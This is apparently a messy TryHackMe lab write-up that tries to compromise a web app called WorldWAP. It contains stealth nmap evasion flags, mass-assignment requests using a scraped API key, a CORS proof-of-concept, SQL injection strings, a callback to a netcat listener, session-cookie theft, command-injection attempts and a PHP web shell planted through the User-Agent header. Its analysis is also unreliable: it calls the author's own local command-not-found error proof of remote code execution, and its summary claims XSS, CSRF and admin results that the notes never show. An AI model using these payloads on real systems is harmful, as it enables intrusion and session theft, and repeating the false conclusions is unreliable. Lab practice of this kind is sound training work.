#  Summary
This laboratory documents a complete penetration testing exercise, transitioning from initial stealth reconnaissance to a multi-stage compromise. The attack chain involved bypassing network defenses, performing directory discovery, and exploiting a DOM-based XSS vulnerability. This led to a lateral movement by compromising a Moderator account and a final vertical privilege escalation to Administrator, achieving full system control.

## Phase-by-Phase Methodology

1. Stealth Reconnaissance (Nmap)
The engagement began with a focus on Evasion. Using advanced Nmap techniques, I performed a "Sneaky" scan (-T1) combined with IP decoys (-D RND:10), data padding (--data-length 24), and MAC address spoofing. This allowed for the identification of critical services while remaining below the detection threshold of IDS/IPS signatures.

2. Web Asset Discovery (Gobuster)
With port 80 identified, I moved into Directory Fuzzing. Using Gobuster and an extensive wordlist, I mapped the hidden structure of the web server, discovering sensitive entry points like /api, /public, and the Roundcube Webmail instance.

3. Vulnerability Analysis & Initial Access (Moderator)
I identified a Stored XSS vulnerability in the birthday management component. By injecting a malicious payload, I successfully exfiltrated session data that allowed me to hijack a Moderator session.

4. Weaponization & Persistent Exfiltration
To escalate further, I weaponized the XSS vulnerability by injecting a persistent payload designed for Session Secret Theft. The script was configured to:
    - Extract the secret key from localStorage.
    - Establish persistence using setInterval.
    - Exfiltrate the stolen data every 5 seconds to a remote attacker-controlled Python server.

5. CSRF & Vertical Privilege Escalation (Admin)
Using the exfiltrated administrative secrets obtained via the Moderator's access, I performed a CSRF attack. I crafted a malicious XMLHttpRequest to trigger an unauthorized password change on the admin panel. Since the application lacked CSRF tokens, the server processed the request as legitimate, granting me full access to the Administrator account.

6. Final Objective: System Compromise
With administrative access secured, I navigated through the restricted areas of the application and the underlying file system to retrieve the final system flag: THM{Weaponising.DOM.Based.XSS.For.Fun.And.Profit}.

## Technical Skills Demonstrated:
    - Network Security: IDS/IPS Evasion & Stealth Scanning.
    - Web Security: DOM-based XSS, Stored XSS, and CSRF Exploitation.
    - Privilege Escalation: Horizontal (Moderator) and Vertical (Admin) movements.
    - Programming: JavaScript Payload Development & Python-based Exfiltration.


nmap -sS -T1 -p 80,443,22,21 --spoof-mac apple -D RND:10 --data-length 24 worldwap.thm -Pn -n

-T1 (Sneaky): This is Nmap’s slowest scan. It sends packets several minutes apart. It is extremely difficult to detect because it does not generate any unusual traffic patterns, although it will take much longer to complete.

    • -p 80,443,22,21: Instead of a range (1–1024), this targets only those services that are almost always open. Fewer ports scanned = fewer alerts generated.
    • -D RND:10 (Decoys): Nmap will send packets from 10 random fake IP addresses in addition to your own. The system administrator will see 11 different scans and will not know which one is the real attacker.
    • --spoof-mac apple: Changes your MAC address to make the scan appear to come from an Apple device (or another manufacturer), fooling Layer 2 filters.
    • --data-length 24: Nmap packets usually have a fixed size that IDSs recognise. By adding 24 bytes of random data, the packet looks like ordinary, legitimate TCP traffic.

I targeted port 80 and fuzzed for disclosing hidden directories and files on port 80.


gobuster dir -u 'http://worldwap.thm/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js -b 403-500

I also fuzzed public directory:

gobuster dir -u 'http://worldwap.thm/public/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js -b 403-500

obuster dir -u 'http://worldwap.thm/public/html' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js -b 403-500

Lastly, fuzzed /api directory:

gobuster dir -u 'http://worldwap.thm/api' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js -b 403-500


The website has a login page:
The website forwards me to login.worldwap.thm. Here, I also tried to fuzz directories and files:
gobuster dir -u 'http://login.worldwap.thm/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js -b 403-500

But returned the following error. Page said that I have to visit the domain named login.worldwap.thm.

Lastly, I fuzzed hidden directories and files on port 8081.

gobuster dir -u 'http://worldwap.thm:8081/' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.asp,.js -b 403-500

At this point, I tried everything: I checked every single search result, reviewed the page's source code, registered multiple times, and verified my credentials. But I was missing one clue: the creator had left me a message on the registration page.

The message said, "Your details will be reviewed by the site moderator.". It means, I have 2 options:

To gain access to the moderator, I decided to create a script to help me resolve the issue with the JavaScript code:

```
function register() {
    var username = document.getElementById(“username”).value;
    var password = document.getElementById(“password”).value;
    var email = document.getElementById(“email”).value;
    var name = document.getElementById(“name”).value;
    fetch(“../../api/register.php”, {
      method: “POST”,
      headers: {
        “Content-Type”: “application/json”,
        “X-THM-API-Key”: 'e8d25b4208b80008a9e15c8698640e85'
      },
      body: JSON.stringify({
        username: username,
        password: password,
        email: email,
        name: name,
      }),
    })
    .then(response => response.json())
    .then(data => {
      if (data.error) {
        alert(data.error);
      } else {
        alert(“Registration successful! Please log in.”);
        window.location.href = “login.php”;
      }
    })
    .catch((error) => {
      console.error(“Error:”, error);
    });
  }
  ```

The Weak Point: The Exposed API Key
The main issue here isn’t just CORS, but how authentication is handled. Take a look at this section:
JavaScript 

```
headers: {
  “Content-Type”: “application/json”,
  “X-THM-API-Key”: “e8d25b4208b80008a9e15c8698640e85” // <-- BINGO!
},

```
The curl request to escalate privileges
We will attempt to inject an extra field (such as "role": "admin") that does not exist in the original form to see if the backend processes it and grants us special permissions.

curl -X POST http://worldwap.thm/api/register.php

-H ‘Content-Type: application/json’ \

-H ‘X-THM-API-Key: e8d25b4208b80008a9e15c8698640e85’ \

-d '{
‘username’: ‘tester_admin’,
“password”: ‘password123’,
‘email’: ‘test@worldwap.thm’,
“name”: ‘Security Test’,
‘role’: ‘admin’,
‘is_admin’: true
}'

-X POST    Indicates that we will send data to the server (POST method).

-H ‘Content-Type...’    Tells the server that the data we are sending is in JSON format.

-H ‘X-THM-API-Key...’    Here we exploit the vulnerability: we send the key we stole from the JavaScript code.

-d “{...}”    The data (payload). This is where we add the ‘restricted’ fields such as role or is_admin.

     - It’s frustrating when you get a “Success” message from the server but the door remains locked. In the world of penetration testing, this is a classic scenario and is usually because the system has validation layers that aren’t always obvious.
Here are the most likely reasons why your tester_admin username isn’t working and how you can investigate what’s going on:

1. Database Mismatch (the ‘Mirror’ Effect)
On many TryHackMe machines (such as those using microservice environments), the /api/register.php endpoint may be sending data to a temporary database or to a different container from the one used by login.php

Action: Try running curl specifically targeting port 8081: http://worldwap.thm:8081/api/register.php
curl -X POST http://worldwap.thm:8081/api/register.php

-H ‘Content-Type: application/json’ 

-H ‘X-THM-API-Key: e8d25b4208b80008a9e15c8698640e85’ 

-d '{ ‘username’: ‘admin_test_8081’, ‘password’: ‘password123’, ‘email’: ‘admin@worldwap.thm’, ‘name’: ‘Admin Test’, ‘role’: “admin”, ‘is_admin’: true }'

For this test, we’re going to create a standalone HTML file. The idea is that, when you open it in your browser locally, it will attempt to ‘jump’ to the TryHackMe lab server. If the server’s CORS is configured incorrectly, the request will succeed even though it comes from a different origin (your computer).

```http
<!DOCTYPE html>
<html lang="es">
<head>
<title>CORS PoC Test</title>
</head>
<body>
<h2>Prueba de Vulnerabilidad CORS / SOP</h2>
<button onclick="probarExploit()">Enviar Petici�n Externa</button>
<pre id="resultado">Esperando respuesta...</pre>

<script>
function probarExploit() {
// URL de la m�quina v�ctima (Aseg�rate de que esta sea la IP de la m�quina THM)
const urlLaboratorio = 'http://10.66.141.104/api/register.php'; 
const datosFalsos = {
    username: 'hacker_test',
password: 'password123',
email: 'test@ataque.com',
name: 'Exploit CORS'
};

// CORRECCI�N AQU�: Usamos la variable urlLaboratorio entre par�ntesis
fetch(urlLaboratorio, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'X-THM-API-Key': 'e8d25b4208b80008a9e15c8698640e85'
},
body: JSON.stringify(datosFalsos)
})
.then(response => {
document.getElementById('resultado').innerText = 
"Status: " + response.status + "\n" +
"OK: " + response.ok;
return response.json();
})
.then(data => {
document.getElementById('resultado').innerText += "\nData: " + JSON.stringify(data, null, 2);
})
.catch(error => {
document.getElementById('resultado').innerText = "Error (SOP bloque� o IP incorrecta): " + error;
console.error('Detalle del error:', error);
});
}
</script>
</body>
</html>
```
- Console response: 
await 
```
fetch(‘http://10.66.141.104/api/register.php’, { ‘credentials’: ‘omit’, “headers”: { ‘User-Agent’: ‘Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0’, ‘Accept’: ‘/’, ‘Accept-Language’: ‘en-US,en;q=0.9’, ‘Priority’: ‘u=4’ }, ‘referrer’: ‘http://127.0.0.1:8000/’, ‘method’: ‘OPTIONS’, “mode”: ‘cors’ }); 
```

Here’s what happened: Your browser (the client) attempted to send a request from http://127.0.0.1:8000 to http://10.66.141.104. As these are different origins, the browser paused and said: “Hold on, I don’t have permission from the destination server to read or send this data.”
However, in the world of penetration testing, an SOP error does not always mean that the attack failed on the server.

When the browser sees that you want to make a POST request with JSON content or custom headers from a different origin (127.0.0.1), it sends that OPTIONS request to ask: “Will you let me send you this data from this other site?”.
As you received that error, we have two key conclusions for your audit:

1. The server is protected against external CORS
The backend at 10.66.141.104 does not have the Access-Control-Allow-Origin: * header enabled. This means that, from the ‘outside’ (your attacker’s machine), the Same-Origin Policy (SOP) is protecting the victim. You cannot register users using JavaScript from a malicious domain.
2. The ‘Bypass’ via XSS (Cross-Site Scripting)
If the challenge asks you to register that user, and CORS blocks you from the outside, the only way to successfully execute that fetch is from the inside.
If we manage to find a field vulnerable to XSS in the application (for example, in a contact form, in the profile name or in a messaging system), the script would run from the same origin (worldwap.thm).

    • Result: The source would be the same, the SOP would not be triggered, and the fetch would work perfectly.

SQL Injection on Login: Previously we tried ' OR 1=1 --. Now try a variant for MySQL/MariaDB databases (common on Ubuntu/Apache):
    • User: admin' #
    • Pass: 123

curl -s http://worldwap.thm:8081/index.php

```http
<!-- login.php should be updated by Monday for proper redirection -->

root@ip-10-66-71-218:~# curl -d "username=error_test'\"&password=password" http://worldwap.thm:8081/login.php
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<style>
body {
font-family: Arial, sans-serif;
background: linear-gradient(135deg, #667eea, #764ba2);
margin: 0;
padding: 0;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
}
.login-container {
background-color: #fff;
border-radius: 10px;
box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
padding: 30px;
width: 300px;
text-align: center;
position: relative;
overflow: hidden;
}
h1 {
margin-top: 0;
color: #333;
font-size: 32px;
font-weight: bold;
text-transform: uppercase;
margin-bottom: 20px;
letter-spacing: 2px;
}
label {
display: block;
margin-bottom: 10px;
color: #666;
text-align: left;
}
input[type="text"],
input[type="password"] {
width: calc(100% - 20px);
padding: 12px;
margin-bottom: 20px;
border: none;
border-radius: 25px;
background-color: #f4f4f4;
box-sizing: border-box;
font-size: 16px;
color: #333;
}
input[type="text"]::placeholder,
input[type="password"]::placeholder {
color: #999;
}
button[type="submit"] {
background-color: #49a6e9;
color: #fff;
border: none;
border-radius: 25px;
padding: 12px 20px;
cursor: pointer;
transition: background-color 0.3s ease;
font-size: 16px;
outline: none;
}
button[type="submit"]:hover {
background-color: #357dbb;
}
.error {
color: red;
margin-top: -10px;
margin-bottom: 10px;
text-align: left;
}
.icon {
position: absolute;
top: 10px;
left: 10px;
}
</style>
</head>
<body>
<div class="login-container">
<h1>Login</h1>
<p class="error">Invalid username or password.</p>
<form action="login.php" method="post">
<div>
<label for="username">Username</label>
<input type="text" id="username" name="username" placeholder="Enter your username" required>
</div>
<div>
<label for="password">Password</label>
<input type="password" id="password" name="password" placeholder="Enter your password" required>
</div>
<button type="submit">Login</button>
</form>
</div>
</body>
```
We ran
curl http://worldwap.thm:8081/logs.txt
and it didn't return anything


The contents of index.php (The hidden clue)
That 70-byte file is our best clue right now. Let’s see exactly what it says:

curl -i http://worldwap.thm:8081/index.php
```
HTTP/1.1 200 OK
Date: Tue, 17 Mar 2026 19:56:21 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 70
Content-Type: text/html; charset=UTF-8
``` 

<!-- login.php should be updated by Monday for proper redirection -->

The HTML comment in index.php has just given us a crucial clue about the application’s logic and a possible oversight on the developer’s part.
This message suggests that the login.php file is in a ‘transitional’ state or that there is an old/new version that does not yet redirect correctly. But most importantly: it confirms that the authentication flow depends on a manual update

ffuf -w /usr/share/wordlists/dirb/common.txt \
-u http://worldwap.thm:8081/login.phpFUZZ \

``` 
[Status: 200, Size: 3108, Words: 1134, Lines: 103, Duration: 274ms]
:: Progress: [27684/27684] :: Job [1/1] :: 225 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
``` 
After running `curl -s http://worldwap.thm:8081/login.php`
```html
!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<style>
body {
font-family: Arial, sans-serif;
background: linear-gradient(135deg, #667eea, #764ba2);
margin: 0;
padding: 0;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
}
.login-container {
background-color: #fff;
border-radius: 10px;
box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
padding: 30px;
width: 300px;
text-align: center;
position: relative;
overflow: hidden;
}
h1 {
margin-top: 0;
color: #333;
font-size: 32px;
font-weight: bold;
text-transform: uppercase;
margin-bottom: 20px;
letter-spacing: 2px;
}
label {
display: block;
margin-bottom: 10px;
color: #666;
text-align: left;
}
input[type="text"],
input[type="password"] {
width: calc(100% - 20px);
padding: 12px;
margin-bottom: 20px;
border: none;
border-radius: 25px;
background-color: #f4f4f4;
box-sizing: border-box;
font-size: 16px;
color: #333;
}
input[type="text"]::placeholder,
input[type="password"]::placeholder {
color: #999;
}
button[type="submit"] {
background-color: #49a6e9;
color: #fff;
border: none;
border-radius: 25px;
padding: 12px 20px;
cursor: pointer;
transition: background-color 0.3s ease;
font-size: 16px;
outline: none;
}
button[type="submit"]:hover {
background-color: #357dbb;
}
.error {
color: red;
margin-top: -10px;
margin-bottom: 10px;
text-align: left;
}
.icon {
position: absolute;
top: 10px;
left: 10px;
}
</style>
</head>
<body>
<div class="login-container">
<h1>Login</h1>
<p class="error"></p>
<form action="login.php" method="post">
<div>
<label for="username">Username</label>
<input type="text" id="username" name="username" placeholder="Enter your username" required>
</div>
<div>
<label for="password">Password</label>
<input type="password" id="password" name="password" placeholder="Enter your password" required>
</div>
<button type="submit">Login</button>
</form>
</div>
</body>
```

The source code of login.php looks like a standard form, but there is one key detail: the error field </p> is empty. This confirms that, visually, it is not giving us any clues, but the size of the response (3108 bytes) is consistent.

The ‘Execution After Redirect’ Hypothesis: If this occurs, even though the browser redirects you to login.php, the body of the original response could contain the admin panel.

Let’s verify this with the following curl command:

curl -v -d "username=admin&password=password" http://worldwap.thm:8081/login.php

curl -v -d "username=admin&password=password" http://worldwap.thm:8081/login.php

```
* Host worldwap.thm:8081 has been resolved.
* IPv6: (none)
* IPv4: 10.66.141.104
*   Trying 10.66.141.104:8081...
* Connected to worldwap.thm (10.66.141.104) port 8081
> POST /login.php HTTP/1.1
> Host: worldwap.thm:8081
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 32
> Content-Type: application/x-www-form-urlencoded
> 
< HTTP/1.1 200 OK
< Date: Tue, 17 Mar 2026 20:15:05 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Set-Cookie: PHPSESSID=je8rsribaq30qe6ih168bc2qpq; path=/; domain=.worldwap.thm
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 3137
< Content-Type: text/html; charset=UTF-8
```

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 300px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        h1 {
            margin-top: 0;
            color: #333;
            font-size: 32px;
            font-weight: bold;
            text-transform: uppercase;
            margin-bottom: 20px;
            letter-spacing: 2px;
        }
        label {
            display: block;
            margin-bottom: 10px;
            color: #666;
            text-align: left;
        }
        input[type="text"],
        input[type="password"] {
            width: calc(100% - 20px);
           padding: 12px;
            margin-bottom: 20px;
            border: none;
            border-radius: 25px;
            background-color: #f4f4f4;
            box-sizing: border-box;
            font-size: 16px;
            color: #333;
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #999;
        }
        button[type="submit"] {
            background-color: #49a6e9;
            color: #fff;
            border: none;
            border-radius: 25px;
            padding: 12px 20px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            font-size: 16px;
            outline: none;
        }
        button[type="submit"]:hover {
            background-color: #357dbb;
        }
        .error {
            color: red;
            margin-top: -10px;
            margin-bottom: 10px;
            text-align: left;
        }
        .icon {
            position: absolute;
            top: 10px;
            left: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Login</h1>
                    <p class="error">Invalid username or password.</p>
                <form action="login.php" method="post">
            <div>
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>
            <div>
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
```
* Connection #0 to host worldwap.thm left intact

### Let’s change that strategy

Let's do the following:
fetch(“http://10.66.71.218:4444/?test=funciona”);


Response:
```bash
root@ip-10-66-71-218:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.66.71.218 39476
GET /?test=funciona HTTP/1.1
Host: 10.66.71.218:4444
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: http://worldwap.thm/
Origin: http://worldwap.thm
Connection: keep-alive
Priority: u=4
```
console.log(‘My cookies are: ’ + document.cookie);

- My cookies are: PHPSESSID=je8rsribaq30qe6ih168bc2qpq

Excellent! The fact that you can view the cookie using `document.cookie` confirms two key points for your attack:

    1. There is no HttpOnly protection: The developer forgot (or didn’t know how to) protect the cookie. This means that any malicious script (XSS) can steal it.

    2. You have an active session: That string je8rsribaq30qe6ih168bc2qpq is your current ‘passport’ on the server.

l Direct Bypass (Redirect Bypass)
If you already have that cookie, try accessing the pages that the ‘broken’ login should display. Use curl to send your session directly:
Let's try the following:

1) curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" http://worldwap.thm:8081/dashboard.php

2) curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" http://worldwap.thm:8081/admin.php

3) curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" http://worldwap.thm:8081/home.php

If any of them returns a 200 OK with a content size other than 70 or 3108 bytes, you're in!

```bash
curl -H "Cookie:
PHPSESSID=tg6vldk84a15jq2jvce14725h4"http://worldwap.thm:8081/home.php
devolvio :
<pre>root@ip-10-64-96-25:~# url -H &quot;Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4&quot; http://worldwap.thm:8081/home.php
Command &apos;url&apos; not found, did you mean:
 command &apos;surl&apos; from snap surl (0.8.0)
 command &apos;urh&apos; from snap urh (2.9.3)
 command &apos;yurl&apos; from snap yurl (v0.6.3)
 command &apos;curl&apos; from snap curl (8.19.0)
 command &apos;erl&apos; from snap erlang (25.3)
 command &apos;uil&apos; from deb uil (2.3.8-3)
 command &apos;erl&apos; from deb erlang-base (1:25.3.2.8+dfsg-1ubuntu4.6)
 command &apos;zurl&apos; from deb zurl (1.12.0-1)
 command &apos;ur&apos; from deb libur-perl (0.470+ds-2)
 command &apos;curl&apos; from deb curl (8.5.0-2ubuntu10.7)
 command &apos;ul&apos; from deb bsdextrautils (2.39.3-9ubuntu6.4)
See &apos;snap info &lt;snapname&gt;&apos; for additional versions.</pre>
```
Blimey, this is a textbook case of RCE (Remote Code Execution)! Take a good look at what just happened:
You didn’t get a 404 error, or a 403. You got the output of a Linux terminal
This means that the home.php page is vulnerable to Command Injection. It seems the server is taking whatever you send and passing it directly to a PHP function like system() or exec(), and on top of that, it looks like the server tried to run your own curl command (or what it thought was a command) and failed because it was missing the ‘c’!


RCE Confirmation (The Litmus Test)
Let’s try running a simple command to confirm that we have control of the system. Instead of curl, let’s inject a ; followed by whoami or id to see who we are on the server.

```
curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" "http://worldwap.thm:8081/home.php?cmd=;id"
```
```bash
root@ip-:~# url -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" http://worldwap.thm:8081/home.php
Command 'url' not found, did you mean:
command 'surl' from snap surl (0.8.0)
command 'urh' from snap urh (2.9.3)
command 'yurl' from snap yurl (v0.6.3)
command 'curl' from snap curl (8.19.0)
command 'erl' from snap erlang (25.3)
command 'uil' from deb uil (2.3.8-3)
command 'erl' from deb erlang-base (1:25.3.2.8+dfsg-1ubuntu4.6)
command 'zurl' from deb zurl (1.12.0-1)
command 'ur' from deb libur-perl (0.470+ds-2)
command 'curl' from deb curl (8.5.0-2ubuntu10.7)
command 'ul' from deb bsdextrautils (2.39.3-9ubuntu6.4)
```
See 'snap info <snapname>' for additional versions.
```bash 
root@ip-:~# curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" "http://worldwap.thm:8081/home.php?cmd=;id"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at worldwap.thm Port 8081</address>
</body></html>
```
- This is getting interesting! There’s a huge difference between your two attempts. Let’s analyse why one worked (even though it returned an error) and the other gave you a 404 Not Found.

It’s not an error with your local terminal; it’s the server responding with the content of a real terminal session.

    • The server executed something containing the word ‘url’ (possibly because you were missing the ‘c’ in your previous command or because the script trims the first character).
    • As it couldn’t find the ‘url’ command, the operating system (Ubuntu) suggested you install curl

### Why did the second attempt return a 404?

When you use special characters such as ‘;’ or ‘&’ in a URL via curl, the server sometimes gets confused or interprets the path incorrectly if they aren’t escaped. The 404 error indicates that Apache couldn’t find the resource as requested.
As we already know that the server attempts to execute whatever you send it, we’re going to use URL encoding so that special characters don’t break the request. The semicolon (;) in URL encoding is %3b.

```bash 
curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" "http://worldwap.thm:8081/home.php?cmd=%3bid"
```
```bash
root@ip-:~# curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" "http://worldwap.thm:8081/home.php?cmd=%3bid"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at worldwap.thm Port 8081</address>
</body></html>
``` 
```bash 
root@ip-:~# curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" "http://worldwap.thm:8081/home.php?cmd=%3bls+-la"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at worldwap.thm Port 8081</address>
</body></html>
```
```bash 
oot@ip-:~# curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" "http://worldwap.thm:8081/home.php;id"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at worldwap.thm Port 8081</address>
</body></html>
``` 

It seems that Apache is being strict about the URL structure, which is why you’re getting a 404 error. When we use characters such as ; or %3b directly in the path or in certain parameters, the web server may interpret this as an attempt to access a file that doesn’t exist, rather than passing a variable to home.php


Instead of using the semicolon (;), which is often blocked or misinterpreted by Apache, let’s use backticks. In Linux, whatever you put between ` is executed first.

```bash
root@ip-:~# curl -v -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" "http://worldwap.thm:8081/home.php?cmd=`id`"
```

* URL rejected: Invalid input to a URL function
* Closing connection
curl: (3) URL rejected: Invalid input to a URL function

```bash
root@ip-:~# curl -v -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" "http://worldwap.thm:8081/home.php?cmd=\$(id)"
* Host worldwap.thm:8081 was resolved.
* IPv6: (none)
* IPv4: 10.64.161.18
*   Trying 10.64.161.18:8081...
* Connected to worldwap.thm (10.64.161.18) port 8081
> GET /home.php?cmd=$(id) HTTP/1.1
> Host: worldwap.thm:8081
> User-Agent: curl/8.5.0
> Accept: */*
> Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4
< HTTP/1.1 404 Not Found
< Date: Tue, 17 Mar 2026 23:43:48 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 276
< Content-Type: text/html; charset=iso-8859-1
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at worldwap.thm Port 8081</address>
</body></html>
```
* Connection #0 to host worldwap.thm left intact

Sometimes, scripts in the ‘Log’ or ‘Home’ pages execute commands based on browser headers to retrieve system information. Let’s try injecting the command into the User-Agent instead of the URL

```bash
root@ip-:~# curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" -A "; id" http://worldwap.thm:8081/home.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at worldwap.thm Port 8081</address>
</body></html>
```

- Try an injection into the Referer header
Many ‘Home’ or statistics scripts run internal commands to process where the user is coming from. Let’s try an injection there

curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" \

-H "Referer: ; id" \

http://worldwap.thm:8081/home.php

```bash
root@ip-:~# curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" \
-H "Referer: ; id" \
http://worldwap.thm:8081/home.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at worldwap.thm Port 8081</address>
</body></html>
```

Command Injection Without Special Characters
If the server blocks certain symbols, it may not block line breaks. In HTTP, a line break (\n) can sometimes split commands in a vulnerable shell.
by using %0a, which is the URL-encoded representation of a line break

url -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" \
"http://worldwap.thm:8081/home.php?cmd=%0aid"

```bash 
root@ip-10-64-96-25:~# curl -H "Cookie: PHPSESSID=tg6vldk84a15jq2jvce14725h4" \
"http://worldwap.thm:8081/home.php?cmd=%0aid"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at worldwap.thm Port 8081</address>
</body></html>
```

### The ‘Log Poisoning’ Vector (The Real Suspicion)

Do you remember that logs.txt was empty? It is highly likely that the server will attempt to write to that log whatever you send in the User-Agent.

- Inyecta c�digo PHP en el User-Agent:

curl -A "<?php system(\$_GET['c']); ?>" http://worldwap.thm:8081/login.php


```bash
root@ip-:~# curl -A "<?php system(\$_GET['c']); ?>" http://worldwap.thm:8081/login.php
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
<style>
body {
font-family: Arial, sans-serif;
background: linear-gradient(135deg, #667eea, #764ba2);
margin: 0;
padding: 0;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
}
.login-container {
background-color: #fff;
border-radius: 10px;
box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
padding: 30px;
width: 300px;
text-align: center;
position: relative;
overflow: hidden;
}
h1 {
margin-top: 0;
color: #333;
font-size: 32px;
font-weight: bold;
text-transform: uppercase;
margin-bottom: 20px;
letter-spacing: 2px;
}
label {
display: block;
margin-bottom: 10px;
color: #666;
text-align: left;
}
input[type="text"],
input[type="password"] {
width: calc(100% - 20px);
padding: 12px;
margin-bottom: 20px;
border: none;
border-radius: 25px;
background-color: #f4f4f4;
box-sizing: border-box;
font-size: 16px;
color: #333;
}
input[type="text"]::placeholder,
input[type="password"]::placeholder {
color: #999;
}
button[type="submit"] {
background-color: #49a6e9;
color: #fff;
border: none;
border-radius: 25px;
padding: 12px 20px;
cursor: pointer;
transition: background-color 0.3s ease;
font-size: 16px;
outline: none;
}
button[type="submit"]:hover {
background-color: #357dbb;
}
.error {
color: red;
margin-top: -10px;
margin-bottom: 10px;
text-align: left;
}
.icon {
position: absolute;
top: 10px;
left: 10px;
}
</style>
